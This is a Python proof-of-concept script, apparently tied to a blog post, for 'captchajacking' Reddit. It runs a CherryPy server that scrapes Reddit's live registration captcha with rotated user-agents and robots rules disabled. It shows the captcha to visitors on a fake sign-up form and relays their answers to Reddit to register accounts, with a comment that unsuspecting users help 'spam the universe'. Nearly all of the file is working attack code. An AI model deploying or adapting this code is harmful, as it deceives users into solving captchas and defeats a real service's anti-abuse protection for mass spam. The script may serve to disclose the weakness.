from random import choice
import cherrypy
import requests
import re
import os.path
import cookielib
import logging
import mechanize
"""Note: Mechanize has to be used as captcha validation is in real time, 
posting captcha details doesn't quite work and is painful"""
## Set cookie jar
cj = cookielib.LWPCookieJar()
br = mechanize.Browser()
br.set_cookiejar(cj)
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
rsess = requests.Session()
#here we go, cherrypy webserver initiation
class reddit_cjack:
	def index(self):
		#open list of User-Agents and chuck into a list
		ualist= [line.rstrip() for line in open('useragents.txt')]
		#random user-agent
		br.addheaders = [('User-agent', '{0}'.format(choice(ualist)))]
		br.open("http://www.reddit.com/register")
		source_fixed1 = br.response().read()
		#regex for the captcha file name and unique name
		cap_iden1 = re.compile(r'value="[A-Za-z0-9]{32}')
		captchai1 = cap_iden1.search(source_fixed1)
		cident_raw1 = captchai1.group()
		cident1 = captchai1.group()
		cident1 = cident1.replace("value=\"", "")
		#just some formatting
		captchaname1 = "captchas/" + cident1 + ".png"
		captchaurl1 = "http://reddit.com/captcha/{0}.png".format(cident1)
		#saving the captcha locally
		with open(captchaname1, 'wb') as handle:
		    request = rsess.get(captchaurl1, headers=headers, stream=True)

		    for block in request.iter_content(1024):
		        if not block:
		            break

		        handle.write(block)
		#signup form with captcha inputted 
		return """<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8" />
<title>Reddit Captcha Hijacking PoC</title>
<link rel="stylesheet" href="css/master.css" type="text/css" />
</head>
<body id="index">
        <div id="container">
            <div id="header"><h1>Captchajacking PoC - blog post <a href="http://blog.shubh.am/">here.</a></h1></div>
            <div id="main">
                <form action="execute" method="post">
                <table cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td class="form-input-name">Username</td>
                        <td class="input"><input type="username" name="username" placeholder="crash override" autocomplete="off" required="required" /></td>
                    </tr>
                    <tr>
                        <td class="form-input-name">Password</td>
                        <td class="input"><input type="password" name="passw" placeholder="gibsonhacker101" autocomplete="off" required="required" /></td>
                    </tr>
        
                    <tr>
                        <td class="form-input-name">Captcha</td>
                        <td class="input">""" + """<img src=""" + captchaname1 + """></img>""" + """<textarea name="captcha" rows="5" cols="29" placeholder="Captcha Text"></textarea></td>
                    </tr>
                    <tr>
                        <td class="form-input-name"></td>
                        <td><input type="submit" value="Register" /></td>
                    </tr>
                </table>
                </form>
            </div>
        </div>
</body>
</html>"""
	index.exposed = True
	#user who signs up to our website unsuspecingly is helping us spam the universe
	def execute(self, username, passw, captcha):
		#selecting the first form (registration form)
		br.select_form(nr=0)
		#setting the relevant values obtained from CherryPy post req.
		br.form[ 'user' ] = username
		br.form[ 'passwd' ] = passw
		br.form[ 'passwd2' ] = passw
		br.form[ 'captcha' ] = captcha
		#submitting form!
		br.submit()

	execute.exposed= True
PATH = os.path.abspath(os.path.dirname(__file__))
conf = {
        '/': {
                'tools.staticdir.on': True,
                'tools.staticdir.dir': PATH,
            },
    }
cherrypy.tree.mount(reddit_cjack(), "/", config=conf)
cherrypy.engine.start()
cherrypy.engine.block()